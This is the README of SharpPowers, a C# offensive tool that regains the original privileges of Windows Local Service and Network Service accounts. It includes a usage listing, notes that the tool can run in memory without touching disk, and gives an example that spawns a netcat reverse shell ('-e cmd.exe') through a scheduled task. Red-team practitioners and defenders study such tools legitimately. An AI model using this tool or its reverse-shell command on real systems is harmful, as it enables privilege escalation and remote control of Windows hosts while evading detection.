# SharpPowers
A C# Implementation of itmn's <a href="https://github.com/itm4n/FullPowers">FullPowers</a>.
This will attempt to obtain the original privileges of the Network Service/Local Service account when run in a restricted context (i.e. no SEImpersonate Privilege).
Noteable, when running in non-interactive mode, the binary does not need to be dropped to disk, allowing it to be executed in memory (i.e. execute-assembly).
## How to run
```
SharpPowers.exe: C# Implementation of @it4mn's FullPowers (https://github.com/itm4n/FullPowers), allowing to run non-interactive commands without needing binary on disk
                Creator: @ret2desync
                Original Creator: @it4mn
Arguments
         -c <Command>: Command/arguments to pass to the executeable
         -f <File_To_Execute>: Specifies which executeable file to run (default is cmd.exe)
         -h : Show help menu.
         -i : Interact with the new process (Default is to run without interaction) - Note: This requires that the this binary is on disk (i.e. not run in memory)
         -x : Attempt to obtain the extended set of privileges
```
## Example run
Run netcat to spawn a reverse shell as Local Service/Network Service with original privileges.

```
SharpPowers.exe -f "D:\Tools\nc64.exe" -c "127.0.0.1 9002 -e cmd.exe"
[**] Will attempt to run: D:\Tools\nc64.exe 127.0.0.1 9002 -e cmd.exe as current user requesting privileges back without interacting with the new process
[+] New scheduled task created PID: 25828
```
## References
it4mn's blog post on the original concept <a href="https://itm4n.github.io/localservice-privileges/">here</a>.
